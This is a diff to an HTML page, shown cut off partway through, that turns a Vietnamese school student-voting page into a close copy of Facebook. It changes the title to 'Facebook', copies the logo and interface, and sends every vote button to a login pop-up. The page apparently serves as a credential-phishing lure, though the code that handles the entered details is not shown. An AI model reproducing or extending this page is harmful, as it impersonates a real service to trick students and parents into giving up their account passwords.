@@ -3,153 +3,1419 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bình chọn Học sinh Xuất sắc | Facebook Style</title>
+    <title>Facebook</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="stylesheet" href="css/style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Noto+Sans+Display:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        /* Facebook Color Scheme */
+        :root {
+            --primary: #1877f2;
+            --primary-hover: #166fe5;
+            --secondary: #42b72a;
+            --secondary-hover: #36a420;
+            --background: #f0f2f5;
+            --card-background: #ffffff;
+            --text-primary: #050505;
+            --text-secondary: #65676b;
+            --divider: #ced0d4;
+            --hover-gray: #e4e6eb;
+            --active-gray: #d8dadf;
+            --badge-red: #e41e3f;
+            --badge-green: #31a24c;
+            --shadow-1: 0 1px 2px rgba(0, 0, 0, 0.1);
+            --shadow-2: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Base Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Segoe UI Historic, Segoe UI, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--background);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        /* Facebook Header */
+        .facebook-header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 56px;
+            background-color: var(--card-background);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 16px;
+            box-shadow: var(--shadow-1);
+            z-index: 1000;
+        }
+
+        .header-left, .header-center, .header-right {
+            display: flex;
+            align-items: center;
+            height: 100%;
+        }
+
+        /* Facebook Logo */
+        .fb-logo {
+            height: 40px;
+            margin-right: 8px;
+            cursor: pointer;
+        }
+
+        .fb-logo svg {
+            fill: var(--primary);
+            height: 100%;
+        }
+
+        /* Search Bar */
+        .search-bar {
+            background-color: #f0f2f5;
+            height: 40px;
+            border-radius: 50px;
+            display: flex;
+            align-items: center;
+            padding: 0 12px;
+            width: 240px;
+            transition: all 0.2s;
+        }
+
+        .search-bar:hover {
+            background-color: #e4e6e9;
+        }
+
+        .search-icon {
+            color: var(--text-secondary);
+            margin-right: 8px;
+            font-size: 14px;
+        }
+
+        .search-input {
+            border: none;
+            background: transparent;
+            outline: none;
+            font-size: 15px;
+            width: 100%;
+        }
+
+        /* Menu Icons */
+        .menu-icon {
+            width: 111px;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            position: relative;
+            border-radius: 8px;
+            transition: background-color 0.2s;
+        }
+
+        .menu-icon:hover {
+            background-color: var(--hover-gray);
+        }
+
+        .menu-icon.active {
+            color: var(--primary);
+        }
+
+        .menu-icon.active::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background-color: var(--primary);
+        }
+
+        .menu-icon i {
+            font-size: 24px;
+        }
+
+        .notification-badge {
+            position: absolute;
+            top: 6px;
+            right: 28px;
+            background-color: var(--badge-red);
+            color: white;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            font-size: 11px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            border: 2px solid var(--card-background);
+        }
+
+        /* Right Menu */
+        .right-menu {
+            display: flex;
+            align-items: center;
+        }
+
+        .profile-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            overflow: hidden;
+            margin-left: 8px;
+            cursor: pointer;
+        }
+
+        .profile-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* Menu Toggle (3 gạch) */
+        .menu-toggle {
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            margin-right: 8px;
+            border-radius: 50%;
+            transition: background-color 0.2s;
+        }
+
+        .menu-toggle:hover {
+            background-color: var(--hover-gray);
+        }
+
+        .menu-toggle i {
+            font-size: 20px;
+            color: var(--text-primary);
+        }
+
+        /* Main Content */
+        .main-content {
+            display: flex;
+            padding-top: 56px;
+            min-height: calc(100vh - 56px);
+        }
+
+        /* Left Sidebar */
+        .left-sidebar {
+            width: 360px;
+            padding: 20px 12px 20px 16px;
+            position: fixed;
+            height: calc(100vh - 56px);
+            overflow-y: auto;
+            overscroll-behavior: contain;
+        }
+
+        .sidebar-item {
+            display: flex;
+            align-items: center;
+            padding: 8px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-bottom: 2px;
+            transition: background-color 0.2s;
+        }
+
+        .sidebar-item:hover {
+            background-color: var(--hover-gray);
+        }
+
+        .sidebar-item.active {
+            background-color: var(--hover-gray);
+            font-weight: 600;
+        }
+
+        .sidebar-icon {
+            width: 36px;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            background-color: var(--hover-gray);
+            border-radius: 50%;
+        }
+
+        .sidebar-item.active .sidebar-icon {
+            background-color: var(--primary);
+            color: white;
+        }
+
+        .sidebar-text {
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .sidebar-badge {
+            margin-left: auto;
+            background-color: var(--hover-gray);
+            color: var(--text-primary);
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+
+        .divider {
+            height: 1px;
+            background-color: var(--divider);
+            margin: 10px 0;
+        }
+
+        .shortcut-title {
+            color: var(--text-secondary);
+            font-size: 17px;
+            font-weight: 600;
+            padding: 8px 0 4px 8px;
+        }
+
+        /* Center Content */
+        .center-content {
+            flex: 1;
+            margin: 0 360px;
+            padding: 20px 16px;
+            max-width: 680px;
+        }
+
+        /* Story Section */
+        .story-section {
+            background-color: var(--card-background);
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 16px;
+            box-shadow: var(--shadow-1);
+            display: flex;
+            overflow-x: auto;
+            overscroll-behavior: contain;
+            scrollbar-width: none;
+        }
+
+        .story-section::-webkit-scrollbar {
+            display: none;
+        }
+
+        .story {
+            min-width: 110px;
+            height: 190px;
+            border-radius: 8px;
+            margin-right: 8px;
+            position: relative;
+            overflow: hidden;
+            cursor: pointer;
+            flex-shrink: 0;
+            background-size: cover;
+            background-position: center;
+        }
+
+        .story:last-child {
+            margin-right: 0;
+        }
+
+        .story-avatar {
+            position: absolute;
+            top: 8px;
+            left: 8px;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border: 3px solid var(--primary);
+            object-fit: cover;
+        }
+
+        .story-add {
+            position: absolute;
+            bottom: 8px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: var(--primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 20px;
+        }
+
+        .story-author {
+            position: absolute;
+            bottom: 16px;
+            left: 8px;
+            color: white;
+            font-weight: 600;
+            font-size: 13px;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+        }
+
+        /* Create Post */
+        .create-post {
+            background-color: var(--card-background);
+            border-radius: 8px;
+            padding: 12px 16px 16px;
+            margin-bottom: 16px;
+            box-shadow: var(--shadow-1);
+        }
+
+        .post-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+
+        .post-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            margin-right: 8px;
+            cursor: pointer;
+            object-fit: cover;
+        }
+
+        .post-input {
+            background-color: var(--background);
+            border: none;
+            border-radius: 20px;
+            padding: 10px 12px;
+            font-size: 15px;
+            width: 100%;
+            cursor: pointer;
+        }
+
+        .post-input:hover {
+            background-color: var(--hover-gray);
+        }
+
+        .post-divider {
+            height: 1px;
+            background-color: var(--divider);
+            margin: 12px 0;
+        }
+
+        .post-options {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .post-option {
+            display: flex;
+            align-items: center;
+            padding: 8px;
+            border-radius: 8px;
+            cursor: pointer;
+            flex: 1;
+            justify-content: center;
+            transition: background-color 0.2s;
+        }
+
+        .post-option:hover {
+            background-color: var(--hover-gray);
+        }
+
+        .post-option i {
+            margin-right: 8px;
+            font-size: 18px;
+        }
+
+        .live-video i { color: #f3425f; }
+        .photo-video i { color: #45bd62; }
+        .feeling i { color: #f7b928; }
+
+        /* Post Styles */
+        .post {
+            background-color: var(--card-background);
+            border-radius: 8px;
+            padding: 12px 16px 16px;
+            margin-bottom: 16px;
+            box-shadow: var(--shadow-1);
+            position: relative;
+        }
+
+        .post-time {
+            color: var(--text-secondary);
+            font-size: 13px;
+            margin-top: 2px;
+        }
+
+        .post-time i {
+            margin-right: 4px;
+        }
+
+        .post-content {
+            margin: 12px 0;
+        }
+
+        .post-text {
+            font-size: 15px;
+            line-height: 1.4;
+            margin-bottom: 12px;
+        }
+
+        .post-image {
+            width: 100%;
+            border-radius: 8px;
+            margin-bottom: 8px;
+            cursor: pointer;
+        }
+
+        .post-footer {
+            display: flex;
+            justify-content: space-between;
+            padding-top: 8px;
+            border-top: 1px solid var(--divider);
+            margin-top: 8px;
+        }
+
+        .footer-action {
+            display: flex;
+            align-items: center;
+            padding: 8px;
+            border-radius: 4px;
+            cursor: pointer;
+            flex: 1;
+            justify-content: center;
+            transition: background-color 0.2s;
+            color: var(--text-secondary);
+            font-weight: 600;
+        }
+
+        .footer-action:hover {
+            background-color: var(--hover-gray);
+        }
+
+        .footer-action i {
+            margin-right: 6px;
+            font-size: 18px;
+        }
+
+        .liked {
+            color: var(--primary);
+        }
+
+        /* Voting Post */
+        .voting-post {
+            background-color: var(--card-background);
+            border-radius: 8px;
+            padding: 12px 16px 16px;
+            margin-bottom: 16px;
+            box-shadow: var(--shadow-1);
+            position: relative;
+        }
+
+        .voting-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: var(--primary);
+            text-align: center;
+        }
+
+        .candidate {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 8px;
+            transition: all 0.2s;
+            border: 1px solid var(--divider);
+        }
+
+        .candidate:hover {
+            background-color: var(--hover-gray);
+            transform: translateY(-1px);
+        }
+
+        .candidate-avatar {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-right: 12px;
+            border: 2px solid var(--primary);
+            cursor: pointer;
+        }
+
+        .candidate-info {
+            flex: 1;
+        }
+
+        .candidate-name {
+            font-weight: 600;
+            font-size: 16px;
+            margin-bottom: 4px;
+            cursor: pointer;
+        }
+
+        .candidate-name:hover {
+            text-decoration: underline;
+        }
+
+        .candidate-class {
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .vote-count {
+            color: var(--text-secondary);
+            font-size: 13px;
+            margin-top: 4px;
+        }
+
+        .vote-btn {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+        }
+
+        .vote-btn:hover {
+            background-color: var(--primary-hover);
+            transform: translateY(-1px);
+        }
+
+        .vote-btn:active {
+            transform: translateY(0);
+        }
+
+        .vote-btn i {
+            margin-right: 6px;
+        }
+
+        /* Right Sidebar */
+        .right-sidebar {
+            width: 360px;
+            padding: 20px 16px 20px 12px;
+            position: fixed;
+            right: 0;
+            height: calc(100vh - 56px);
+            overflow-y: auto;
+            overscroll-behavior: contain;
+        }
+
+        .contact-item {
+            display: flex;
+            align-items: center;
+            padding: 8px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-bottom: 2px;
+            transition: background-color 0.2s;
+            position: relative;
+        }
+
+        .contact-item:hover {
+            background-color: var(--hover-gray);
+        }
+
+        .contact-avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-right: 12px;
+            cursor: pointer;
+        }
+
+        .contact-name {
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .contact-status {
+            position: absolute;
+            right: 12px;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: var(--badge-green);
+            border: 2px solid var(--card-background);
+        }
+
+        /* Login Modal */
+        .login-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(5px);
+        }
+
+        .login-container {
+            background-color: var(--card-background);
+            border-radius: 8px;
+            width: 432px;
+            box-shadow: var(--shadow-2);
+            overflow: hidden;
+            transform: scale(0.9);
+            opacity: 0;
+            transition: all 0.3s;
+        }
+
+        .login-container.active {
+            transform: scale(1);
+            opacity: 1;
+        }
+
+        .login-header {
+            padding: 16px;
+            border-bottom: 1px solid var(--divider);
+            text-align: center;
+            position: relative;
+        }
+
+        .login-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--text-primary);
+        }
+
+        .login-close {
+            position: absolute;
+            right: 16px;
+            top: 16px;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .login-close:hover {
+            background-color: var(--hover-gray);
+            transform: rotate(90deg);
+        }
+
+        .login-body {
+            padding: 16px;
+        }
+
+        .login-input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid var(--divider);
+            border-radius: 6px;
+            font-size: 16px;
+            transition: all 0.2s;
+        }
+
+        .login-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: all 0.2s;
+        }
+
+        .login-btn:hover {
+            background-color: var(--primary-hover);
+        }
+
+        .login-footer {
+            padding: 16px;
+            border-top: 1px solid var(--divider);
+            text-align: center;
+        }
+
+        .signup-btn {
+            background-color: var(--secondary);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: 600;
+            padding: 12px 16px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .signup-btn:hover {
+            background-color: var(--secondary-hover);
+        }
+
+        /* Toast Notification */
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background-color: var(--text-primary);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 8px;
+            box-shadow: var(--shadow-2);
+            z-index: 3000;
+            opacity: 0;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+        }
+
+        .toast.show {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1;
+        }
+
+        .toast i {
+            margin-right: 8px;
+            font-size: 20px;
+        }
+
+        /* Responsive */
+        @media (max-width: 1200px) {
+            .left-sidebar, .right-sidebar {
+                width: 280px;
+            }
+            .center-content {
+                margin: 0 280px;
+            }
+        }
+
+        @media (max-width: 992px) {
+            .right-sidebar {
+                transform: translateX(100%);
+            }
+            .right-sidebar.active {
+                transform: translateX(0);
+            }
+            .center-content {
+                margin-right: 0;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .left-sidebar {
+                transform: translateX(-100%);
+            }
+            .left-sidebar.active {
+                transform: translateX(0);
+            }
+            .center-content {
+                margin-left: 0;
+                max-width: 100%;
+            }
+            .search-bar {
+                width: 180px;
+            }
+            .header-center {
+                display: none;
+            }
+            .menu-icon {
+                width: 70px;
+            }
+        }
+    </style>
 </head>
 <body>
-    <!-- Header Facebook Style -->
-    <header class="fb-header">
-        <div class="header-container">
-            <div class="logo-search">
-                <div class="fb-logo">
-                    <i class="fab fa-facebook"></i>
-                </div>
-                <div class="search-box">
-                    <i class="fas fa-search"></i>
-                    <input type="text" placeholder="Tìm kiếm học sinh...">
-                </div>
+    <!-- Facebook Header -->
+    <header class="facebook-header">
+        <div class="header-left">
+            <!-- Facebook Logo SVG -->
+            <div class="fb-logo">
+                <svg viewBox="0 0 36 36" width="40" height="40">
+                    <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87z"></path>
+                    <path fill="#FFFFFF" d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.883l-1.008 5.5h-4.867v12.637a18.086 18.086 0 0 1-6.53-.127z"></path>
+                </svg>
             </div>
-            
-            <div class="login-section">
-                <div class="login-form">
-                    <input type="text" placeholder="Email hoặc số điện thoại" id="fb-email">
-                    <input type="password" placeholder="Mật khẩu" id="fb-password">
-                    <button id="login-btn" class="fb-btn primary">Đăng nhập</button>
-                    <a href="#" class="forgot-password">Quên mật khẩu?</a>
+            <div class="search-bar">
+                <i class="fas fa-search search-icon"></i>
+                <input type="text" class="search-input" placeholder="Tìm kiếm trên Facebook">
+            </div>
+        </div>
+        
+        <div class="header-center">
+            <a href="#" class="menu-icon active">
+                <i class="fas fa-home"></i>
+            </a>
+            <a href="#" class="menu-icon">
+                <i class="fas fa-tv"></i>
+            </a>
+            <a href="#" class="menu-icon">
+                <i class="fas fa-store"></i>
+            </a>
+            <a href="#" class="menu-icon">
+                <i class="fas fa-users"></i>
+            </a>
+            <a href="#" class="menu-icon">
+                <i class="fas fa-bell"></i>
+                <div class="notification-badge">9+</div>
+            </a>
+        </div>
+        
+        <div class="header-right">
+            <div class="right-menu">
+                <div class="menu-toggle" id="menuToggle">
+                    <i class="fas fa-bars"></i>
+                </div>
+                <div class="profile-icon">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" alt="Profile">
                 </div>
             </div>
         </div>
     </header>
-
+    
     <!-- Main Content -->
-    <main class="main-container">
-        <div class="cover-photo">
-            <div class="cover-overlay">
-                <h1>Bình chọn Học sinh Xuất sắc 2023</h1>
-                <p>Cùng chọn ra học sinh xuất sắc nhất trường!</p>
+    <main class="main-content">
+        <!-- Left Sidebar -->
+        <aside class="left-sidebar" id="leftSidebar">
+            <div class="sidebar-item active">
+                <div class="sidebar-icon">
+                    <i class="fas fa-user"></i>
+                </div>
+                <div class="sidebar-text">Trang cá nhân</div>
             </div>
-        </div>
-
-        <div class="content-wrapper">
-            <!-- Left Sidebar -->
-            <aside class="left-sidebar">
-                <div class="profile-card">
-                    <div class="profile-avatar">
-                        <img src="assets/images/default-avatar.jpg" alt="User Avatar">
+            <div class="sidebar-item">
+                <div class="sidebar-icon">
+                    <i class="fas fa-users"></i>
+                </div>
+                <div class="sidebar-text">Bạn bè</div>
+                <div class="sidebar-badge">5</div>
+            </div>
+            <div class="sidebar-item">
+                <div class="sidebar-icon">
+                    <i class="fas fa-bookmark"></i>
+                </div>
+                <div class="sidebar-text">Đã lưu</div>
+            </div>
+            <div class="sidebar-item">
+                <div class="sidebar-icon">
+                    <i class="fas fa-flag"></i>
+                </div>
+                <div class="sidebar-text">Trang</div>
+            </div>
+            <div class="sidebar-item">
+                <div class="sidebar-icon">
+                    <i class="fas fa-calendar-alt"></i>
+                </div>
+                <div class="sidebar-text">Sự kiện</div>
+            </div>
+            <div class="sidebar-item" style="background-color: var(--hover-gray);">
+                <div class="sidebar-icon">
+                    <i class="fas fa-chevron-down"></i>
+                </div>
+                <div class="sidebar-text">Xem thêm</div>
+            </div>
+            
+            <div class="divider"></div>
+            
+            <div class="shortcut-title">Lối tắt của bạn</div>
+            <div class="sidebar-item">
+                <div class="sidebar-icon">
+                    <i class="fas fa-graduation-cap"></i>
+                </div>
+                <div class="sidebar-text">Trường học</div>
+            </div>
+            <div class="sidebar-item">
+                <div class="sidebar-icon">
+                    <i class="fas fa-trophy"></i>
+                </div>
+                <div class="sidebar-text">Bình chọn HS xuất sắc</div>
+                <div class="sidebar-badge">!</div>
+            </div>
+        </aside>
+        
+        <!-- Center Content -->
+        <div class="center-content">
+            <!-- Story Section -->
+            <div class="story-section">
+                <div class="story" style="background-image: linear-gradient(rgba(0,0,0,0.1), rgba(0,0,0,0.6)), url('https://source.unsplash.com/random/200x300?school')">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" class="story-avatar">
+                    <div class="story-add">
+                        <i class="fas fa-plus"></i>
                     </div>
-                    <div class="profile-name" id="user-name">Khách</div>
+                    <div class="story-author">Tạo tin</div>
+                </div>
+                <div class="story" style="background-image: linear-gradient(rgba(0,0,0,0.1), rgba(0,0,0,0.6)), url('https://source.unsplash.com/random/200x300?student')">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" class="story-avatar">
+                    <div class="story-author">Mai Ngọc</div>
+                </div>
+                <div class="story" style="background-image: linear-gradient(rgba(0,0,0,0.1), rgba(0,0,0,0.6)), url('https://source.unsplash.com/random/200x300?class')">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" class="story-avatar">
+                    <div class="story-author">Trần Văn</div>
+                </div>
+                <div class="story" style="background-image: linear-gradient(rgba(0,0,0,0.1), rgba(0,0,0,0.6)), url('https://source.unsplash.com/random/200x300?teacher')">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" class="story-avatar">
+                    <div class="story-author">Cô giáo Lan</div>
+                </div>
+                <div class="story" style="background-image: linear-gradient(rgba(0,0,0,0.1), rgba(0,0,0,0.6)), url('https://source.unsplash.com/random/200x300?book')">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" class="story-avatar">
+                    <div class="story-author">Hiệu trưởng</div>
+                </div>
+            </div>
+            
+            <!-- Create Post -->
+            <div class="create-post">
+                <div class="post-header">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" alt="User" class="post-avatar">
+                    <input type="text" class="post-input" placeholder="Bạn đang nghĩ gì?">
+                </div>
+                <div class="post-divider"></div>
+                <div class="post-options">
+                    <div class="post-option live-video">
+                        <i class="fas fa-video"></i>
+                        <span>Video trực tiếp</span>
+                    </div>
+                    <div class="post-option photo-video">
+                        <i class="fas fa-images"></i>
+                        <span>Ảnh/video</span>
+                    </div>
+                    <div class="post-option feeling">
+                        <i class="fas fa-smile"></i>
+                        <span>Cảm xúc/hoạt động</span>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Sample Post 1 -->
+            <div class="post">
+                <div class="post-header">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" alt="User" class="post-avatar">
+                    <div class="post-info">
+                        <div class="post-title">Cô giáo Mai</div>
+                        <div class="post-time">
+                            <i class="fas fa-globe-americas"></i>
+                            Công khai · Hôm qua lúc 15:30
+                        </div>
+                    </div>
                 </div>
                 
-                <nav class="sidebar-menu">
-                    <a href="#" class="menu-item active">
-                        <i class="fas fa-home"></i>
-                        <span>Trang chủ</span>
-                    </a>
-                    <a href="#" class="menu-item">
-                        <i class="fas fa-users"></i>
-                        <span>Danh sách học sinh</span>
-                    </a>
-                    <a href="#" class="menu-item">
-                        <i class="fas fa-chart-bar"></i>
-                        <span>Bảng xếp hạng</span>
-                    </a>
-                </nav>
-            </aside>
-
-            <!-- Main Content Area -->
-            <section class="main-content">
-                <div class="create-post">
-                    <div class="post-header">
-                        <h2>Tạo bài bình chọn</h2>
+                <div class="post-content">
+                    <div class="post-text">
+                        Chúc mừng các em học sinh đã hoàn thành tốt kỳ thi học kỳ vừa qua. Đặc biệt khen ngợi em Nguyễn Văn A lớp 12A1 đã đạt điểm 10 môn Toán!
                     </div>
-                    <div class="post-body">
-                        <textarea placeholder="Bạn muốn bình chọn cho ai?..."></textarea>
-                    </div>
-                    <div class="post-footer">
-                        <button class="fb-btn secondary" disabled id="post-btn">Đăng bài</button>
-                    </div>
-                </div>
-
-                <div class="students-list">
-                    <h2 class="section-title">Danh sách học sinh</h2>
                     
-                    <div class="students-grid" id="students-container">
-                        <!-- Students will be loaded here by JavaScript -->
+                    <img src="https://source.unsplash.com/random/600x400?classroom" class="post-image">
+                </div>
+                
+                <div class="post-footer">
+                    <div class="footer-action" onclick="toggleLike(this)">
+                        <i class="far fa-thumbs-up"></i>
+                        <span>Thích</span>
+                    </div>
+                    <div class="footer-action" onclick="focusComment()">
+                        <i class="far fa-comment"></i>
+                        <span>Bình luận</span>
+                    </div>
+                    <div class="footer-action">
+                        <i class="fas fa-share"></i>
+                        <span>Chia sẻ</span>
                     </div>
                 </div>
-            </section>
-
-            <!-- Right Sidebar -->
-            <aside class="right-sidebar">
-                <div class="sponsors">
-                    <h3>Nhà tài trợ</h3>
-                    <div class="sponsor-item">
-                        <img src="assets/images/sponsor1.png" alt="Sponsor 1">
-                    </div>
-                    <div class="sponsor-item">
-                        <img src="assets/images/sponsor2.png" alt="Sponsor 2">
+            </div>
+            
+            <!-- Sample Post 2 -->
+            <div class="post">
+                <div class="post-header">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" alt="User" class="post-avatar">
+                    <div class="post-info">
+                        <div class="post-title">Thầy Hiệu trưởng</div>
+                        <div class="post-time">
+                            <i class="fas fa-globe-americas"></i>
+                            Công khai · 2 ngày trước
+                        </div>
                     </div>
                 </div>
                 
-                <div class="voting-stats">
-                    <h3>Thống kê bình chọn</h3>
-                    <div class="stats-item">
-                        <span>Tổng lượt bình chọn:</span>
-                        <strong id="total-votes">0</strong>
-                    </div>
-                    <div class="stats-item">
-                        <span>Học sinh dẫn đầu:</span>
-                        <strong id="top-student">Chưa có</strong>
+                <div class="post-content">
+                    <div class="post-text">
+                        Thông báo về lịch nghỉ Tết Nguyên đán: Nhà trường sẽ nghỉ từ ngày 28/1 đến hết ngày 5/2. Các em học sinh lưu ý thời gian quay trở lại trường.
                     </div>
                 </div>
-            </aside>
+                
+                <div class="post-footer">
+                    <div class="footer-action" onclick="toggleLike(this)">
+                        <i class="far fa-thumbs-up"></i>
+                        <span>Thích</span>
+                    </div>
+                    <div class="footer-action" onclick="focusComment()">
+                        <i class="far fa-comment"></i>
+                        <span>Bình luận</span>
+                    </div>
+                    <div class="footer-action">
+                        <i class="fas fa-share"></i>
+                        <span>Chia sẻ</span>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Voting Post -->
+            <div class="voting-post">
+                <div class="post-header">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" alt="User" class="post-avatar">
+                    <div class="post-info">
+                        <div class="post-title">Trường THPT Chuyên ABC</div>
+                        <div class="post-time">
+                            <i class="fas fa-globe-americas"></i>
+                            Công khai · <span id="current-date"></span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="post-content">
+                    <div class="post-text">
+                        Chúng ta hãy cùng bình chọn cho học sinh xuất sắc nhất năm học 2023-2024! Mỗi tài khoản chỉ được bình chọn một lần.
+                    </div>
+                    
+                    <div class="voting-title">BÌNH CHỌN HỌC SINH XUẤT SẮC</div>
+                    
+                    <div class="candidate">
+                        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" alt="Candidate" class="candidate-avatar">
+                        <div class="candidate-info">
+                            <div class="candidate-name">Nguyễn Văn A</div>
+                            <div class="candidate-class">Lớp 12A1 - Điểm TB: 9.2</div>
+                            <div class="vote-count">1,245 lượt bình chọn</div>
+                        </div>
+                        <button class="vote-btn" onclick="showLoginModal()">
+                            <i class="fas fa-vote-yea"></i> Bình chọn
+                        </button>
+                    </div>
+                    
+                    <div class="candidate">
+                        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" alt="Candidate" class="candidate-avatar">
+                        <div class="candidate-info">
+                            <div class="candidate-name">Trần Thị B</div>
+                            <div class="candidate-class">Lớp 11A2 - Điểm TB: 9.5</div>
+                            <div class="vote-count">1,532 lượt bình chọn</div>
+                        </div>
+                        <button class="vote-btn" onclick="showLoginModal()">
+                            <i class="fas fa-vote-yea"></i> Bình chọn
+                        </button>
+                    </div>
+                    
+                    <div class="candidate">
+                        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" alt="Candidate" class="candidate-avatar">
+                        <div class="candidate-info">
+                            <div class="candidate-name">Lê Văn C</div>
